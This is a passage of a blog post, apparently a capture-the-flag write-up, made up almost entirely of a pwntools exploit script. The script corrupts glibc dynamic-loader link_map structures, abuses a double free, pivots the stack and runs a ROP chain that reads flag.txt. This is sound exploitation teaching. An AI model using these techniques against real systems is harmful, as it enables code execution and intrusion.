+    <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">exe</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_init"</span><span class="p">]</span> <span class="o">-</span> <span class="n">l_addr_offset</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="c1"># now, resolving write won't access version info
+</span><span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_VER</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="c1"># reset sym/rela tables
+</span><span class="n">restore_sym_table</span><span class="p">()</span>
+<span class="n">restore_rela_table</span><span class="p">()</span>
+
+
+<span class="c1"># ----------- replace write@got with _dl_fini -----------
+# we need to forge a libc symbol so that we can overwrite write@got with _dl_fini
+# to do this, we'll swap out _dl_x86_get_cpu_features's symtable entry with our own, which will resolve to _dl_fini
+# to write it to write@got, we'll forge a rela entry for _dl_fini, telling it to write the resolution to write@got
+</span>
+<span class="c1"># first, disable destructors from running once we do call _dl_fini. we don't want them to exec mid write.
+</span><span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_init_called</span><span class="p">(),</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="c1"># overwrite lsb of DT_SYMTAB to reference ld's GOT instead of binary's symtab
+# the 9th entry should be in a writeable section, right after the GOT
+</span><span class="n">write</span><span class="p">(</span>
+    <span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_GLOBAL_OFFSET_TABLE_"</span><span class="p">]</span> <span class="o">+</span> <span class="n">elf64_sym</span><span class="p">.</span><span class="n">size</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span>
+    <span class="n">elf64_sym</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x166</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xD</span><span class="p">,</span>
+                   <span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_dl_fini"</span><span class="p">]</span> <span class="o">-</span> <span class="n">ld</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="mh">0xC</span><span class="p">),</span>
+<span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">ld_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_SYMTAB</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xE0</span><span class="p">))</span>
+<span class="c1"># we'll attack the 9th symtab entry, _dl_x86_get_cpu_features. to do this, we swap out the strtable of the binary with our own.
+# instead of reading write at strtable+0x4b, it'll read _dl_x86_get_cpu_features
+</span><span class="n">write</span><span class="p">(</span><span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="sa">b</span><span class="s">"_dl_x86_get_cpu_features"</span><span class="p">)</span>
+<span class="c1"># move resolve _dl_x86_get_cpu_features instead of write
+</span><span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_STRTAB</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xB8</span><span class="p">))</span>
+<span class="c1"># write resolution to write
+</span><span class="n">set_rela_table</span><span class="p">(</span><span class="n">elf64_rela</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span>
+    <span class="n">exe</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"write"</span><span class="p">]</span> <span class="o">-</span> <span class="n">l_addr_offset</span><span class="p">,</span> <span class="mh">0x200000007</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="c1"># cool! let's bring back our rela table.
+</span><span class="n">restore_rela_table</span><span class="p">()</span>
+
+
+<span class="c1"># ----------- house of blindness setup -----------
+# let's restore l_addr
+</span><span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_addr</span><span class="p">(),</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="c1"># DT_FINI should point at _r_debug
+</span><span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_FINI</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xB8</span><span class="p">))</span>
+<span class="c1"># make sure DT_FINI_ARRAY doesn't execute
+</span><span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_FINI_ARRAY</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="c1"># make sure __rtld_mutex_unlock gives up by setting invalid _kind
+</span><span class="n">write</span><span class="p">(</span><span class="n">_rtld_global</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">))</span>
+
+<span class="c1"># ----------- fake linkmap for _dl_fixup -----------
+</span><span class="n">fake_linkmap</span> <span class="o">=</span> <span class="n">link_map</span><span class="p">(</span><span class="n">_rtld_global</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">()</span> <span class="o">-</span> <span class="n">ld</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>
+<span class="n">symtab_dyn</span> <span class="o">=</span> <span class="n">ptr_write</span><span class="p">(</span><span class="n">fake_linkmap</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_SYMTAB</span><span class="p">))</span>
+
+<span class="c1"># ----------- double free to make symtab struct for _dl_fixup -----------
+</span><span class="n">fake_io</span> <span class="o">=</span> <span class="n">io_obj</span><span class="p">(</span><span class="n">_rtld_global</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">())</span>
+<span class="c1"># when the swap happens, we still need 0xff at the mutex
+</span><span class="n">write</span><span class="p">(</span><span class="n">fake_io</span><span class="p">.</span><span class="n">_IO_save_end</span><span class="p">(),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">))</span>
+<span class="c1"># _IO_switch_to_backup_area switches read with save
+</span><span class="n">call_fn</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_switch_to_backup_area"</span><span class="p">])</span>
+<span class="c1"># make size of chunk tcache so memstream takes from it
+</span><span class="n">write</span><span class="p">(</span><span class="n">symtab_dyn</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x200</span> <span class="o">|</span> <span class="mi">1</span><span class="p">))</span>
+<span class="c1"># trick io into thinking we aren't actually swapped
+</span><span class="n">write</span><span class="p">(</span><span class="n">fake_io</span><span class="p">.</span><span class="n">_flags</span><span class="p">(),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="c1"># # _IO_free_backup_area will free _IO_save_base, but this time the ptr will end up in tcache
+</span><span class="n">call_fn</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_free_backup_area"</span><span class="p">])</span>
+<span class="c1"># pull from tcache and write ptrs into mmap
+</span><span class="n">call_fn</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__open_memstream"</span><span class="p">])</span>
+<span class="c1"># move mmap ptr to mmap relative ptr
+</span><span class="n">write</span><span class="p">(</span><span class="n">fake_linkmap</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_SYMTAB</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>
+<span class="n">symtab</span> <span class="o">=</span> <span class="n">symtab_dyn</span> <span class="o">+</span> <span class="mh">0x110</span>
+
+<span class="c1"># ----------- complete linkmap for _dl_fixup -----------
+</span><span class="n">strtab</span> <span class="o">=</span> <span class="n">ptr_write</span><span class="p">(</span><span class="n">fake_linkmap</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_STRTAB</span><span class="p">))</span>
+<span class="n">pltgot</span> <span class="o">=</span> <span class="n">ptr_write</span><span class="p">(</span><span class="n">fake_linkmap</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_PLTGOT</span><span class="p">))</span>
+<span class="n">write</span><span class="p">(</span><span class="n">pltgot</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="c1"># jmprel dyn points to right above the got. move it to point to the got.
+</span><span class="n">write</span><span class="p">(</span><span class="n">fake_linkmap</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_JMPREL</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">))</span>
+<span class="c1"># now, d_ptr will be an mmaped chunk written to got
+</span><span class="n">jmprel</span> <span class="o">=</span> <span class="n">ptr_write</span><span class="p">(</span><span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_GLOBAL_OFFSET_TABLE_"</span><span class="p">])</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="n">ptr_write</span><span class="p">(</span><span class="n">fake_linkmap</span><span class="p">.</span><span class="n">l_addr</span><span class="p">())</span>
+
+
+<span class="k">def</span> <span class="nf">rel_write</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">jmprel</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">elf64_rela</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="n">where</span> <span class="o">-</span> <span class="n">addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x000000007</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">symtab</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">elf64_sym</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">what</span> <span class="o">-</span> <span class="n">addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+    <span class="n">call_fn</span><span class="p">(</span><span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_dl_fixup"</span><span class="p">])</span>
+
+
+<span class="c1"># ----------- stack pivot -----------
+# using rdx gadget found at https://www.willsroot.io/2020/12/yet-another-house-asis-finals-2020-ctf.html
+# 0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
+</span><span class="n">rbx_write_call</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x169E90</span>
+<span class="c1"># set rbx to a ptr to our original mmap page
+</span><span class="n">rel_write</span><span class="p">(</span><span class="n">_rtld_global</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">()</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="c1"># write what to call, setcontext gadget, to rdx + 0x20
+</span><span class="n">rel_write</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"setcontext"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">61</span><span class="p">)</span>
+<span class="c1"># write where to pivot, original_mmap+0x100 to rbx + 0xa0
+</span><span class="n">rel_write</span><span class="p">(</span><span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
+<span class="c1"># rdx + a8 is pushed, so we need a ret gadget here
+</span><span class="n">rel_write</span><span class="p">(</span><span class="mh">0xA8</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"setcontext"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">334</span><span class="p">)</span>
+
+<span class="c1"># ----------- rop chain -----------
+</span><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">],</span> <span class="sa">b</span><span class="s">"flag.txt</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="c1"># open, read, write
+</span><span class="n">rop</span><span class="p">.</span><span class="n">call</span><span class="p">(</span>
+    <span class="s">"syscall"</span><span class="p">,</span>
+    <span class="p">[</span>
+        <span class="n">constants</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">SYS_open</span><span class="p">,</span>
+        <span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">],</span>
+        <span class="mi">0</span><span class="p">,</span>
+    <span class="p">],</span>
+<span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="n">call</span><span class="p">(</span>
+    <span class="s">"syscall"</span><span class="p">,</span>
+    <span class="p">[</span>
+        <span class="n">constants</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">SYS_read</span><span class="p">,</span>
+        <span class="mi">3</span><span class="p">,</span>
+        <span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">],</span>
+        <span class="mi">64</span><span class="p">,</span>
+    <span class="p">],</span>
+<span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="n">call</span><span class="p">(</span>
+    <span class="s">"syscall"</span><span class="p">,</span>
+    <span class="p">[</span>
+        <span class="n">constants</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">SYS_write</span><span class="p">,</span>
+        <span class="n">constants</span><span class="p">.</span><span class="n">STDOUT_FILENO</span><span class="p">,</span>
+        <span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">],</span>
+        <span class="mi">64</span><span class="p">,</span>
+    <span class="p">],</span>
+<span class="p">)</span>
+<span class="c1"># this is so hacky and so wrong but i do not care
+</span><span class="k">def</span> <span class="nf">is_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">):</span> <span class="k">return</span> <span class="n">ptr</span> <span class="o">&gt;</span> <span class="mh">0x1000</span>
+
+
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">gadget</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">build</span><span class="p">()):</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">gadget</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
+        <span class="n">write</span><span class="p">(</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">gadget</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">is_ptr</span><span class="p">(</span><span class="n">gadget</span><span class="p">):</span>
+        <span class="n">rel_write</span><span class="p">(</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">gadget</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">write</span><span class="p">(</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>
+
+<span class="c1"># ----------- win -----------
+</span><span class="n">call_fn</span><span class="p">(</span><span class="n">rbx_write_call</span><span class="p">)</span>
+</code></pre></div></div>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Nightmare:+Novel+Exploitation+Tactics+With+One+Byte+Write.%20-%20https://blog.pepsipu.com/posts/nightmare" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://blog.pepsipu.com/posts/nightmare" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    sponsored by subpar blue: terrorizing tcaches since 2017
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XQXDK9JQPD"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-XQXDK9JQPD');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-3ee2c63bbac916f96cd7f90e83ab767f058ead1301444c9966f5156911c8be7f.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+</body>
+</html>
